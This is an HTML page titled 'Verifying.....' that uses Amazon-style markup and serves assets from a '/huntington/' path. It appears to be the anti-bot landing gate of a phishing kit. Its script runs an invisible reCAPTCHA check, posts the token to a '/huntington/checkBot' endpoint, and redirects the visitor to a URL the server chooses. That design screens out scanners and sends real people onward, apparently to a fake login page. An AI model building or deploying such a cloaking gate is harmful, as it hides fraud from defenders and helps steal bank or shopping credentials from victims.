
<!DOCTYPE html>
<html lang="ja-jp"
      class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition null awa-browser"
      data-19ax5a9jf="mongoose" data-aui-build-date="3.20.1-2020-02-26">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta http-equiv="Expires" content="-1">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no" />


    <meta charset="utf-8">

    <title>Verifying.....</title>
    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script src='https://www.recaptcha.net/recaptcha/api.js?render=6LcEYsUaAAAAAKhC4QEtc47Fm8Wwo6hsvr0LTqOx'></script>
    <style>
        .error {
            color: red
        }

        #zwimel {
            width: 100%;
            height: 100%;
            top: 0px;
            left: 0px;
            position: fixed;
            display: block;
            opacity: .9;
            background-color: #fff;
            z-index: 99;
            text-align: center;
        }

        #loading-image {
            position: fixed;
            width: 125px;
            height: 122px;
            z-index: 1000;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            transform: -webkit-translate(-50%, -50%);
            transform: -moz-translate(-50%, -50%);
            transform: -ms-translate(-50%, -50%);
        }
    </style>
</head>
<body>
<link rel="stylesheet" href="/huntington/css/61ccss.css">
<div id="zwimel" class="zwimel" style="display:none;" ><img id="loading-image" src="/huntington/img/loading.gif">
</body>
<script>
     $("#zwimel").show();
    grecaptcha.ready(function() {
        grecaptcha.execute('6LcEYsUaAAAAAKhC4QEtc47Fm8Wwo6hsvr0LTqOx').then(function(token) {
            console.log(token);
            $.ajax({
                url: '/huntington/checkBot',
                type: 'POST',
                data: {"response":token},
                success: function(result) {
                    $(location).attr("href", result)
                }
            });
        });
    });
</script>

</html>